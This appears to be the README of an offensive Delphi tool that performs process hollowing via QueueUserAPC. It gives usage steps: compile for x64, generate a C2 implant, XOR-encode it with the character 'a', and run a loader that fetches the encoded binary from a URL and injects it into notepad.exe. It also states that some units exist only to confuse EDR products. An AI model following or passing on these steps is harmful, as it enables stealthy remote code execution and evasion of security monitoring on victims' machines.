# delphiprocesshollowing
DelphiProcessHollowing with QueueUserAPC

compile with Embarcadero Community 12

Some Units are added only to confuse EDRs

1. compile it (64bit!)
2. create the BINARY x64 implant with your C2
3. XOR your .BIN payload with the "a" char (or modify pascal source to change it!)
4. run RUNINMEMORY.exe url_to_XORED_binary c:\windows\system32\notepad.exe

normally used to run C2 implants
